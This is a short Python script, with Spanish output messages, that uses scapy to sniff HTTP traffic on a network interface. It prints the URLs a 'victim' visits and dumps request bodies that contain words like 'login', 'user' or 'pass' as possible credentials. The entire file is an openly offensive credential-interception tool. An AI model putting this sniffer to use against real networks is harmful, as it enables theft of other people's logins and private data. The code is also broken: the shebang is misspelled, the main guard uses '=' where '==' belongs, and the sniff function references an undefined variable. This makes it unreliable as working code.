#!/usr/bin/env pyhton3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    
    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) #CTRL+C

def process_packet(packet):
    
    cred_keywords = ["login", "mail", "phone", "user", "pass"]

    if packet.haslayer(http.HTTPRequest):

        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(colored(f"[+] URL visitada por la víctima: {url}", 'blue'))

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}\n", 'green'))
                        break
            except:
                pass

def sniff(interfaz):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("ens33")

if __name__ = '__main__':
    main()
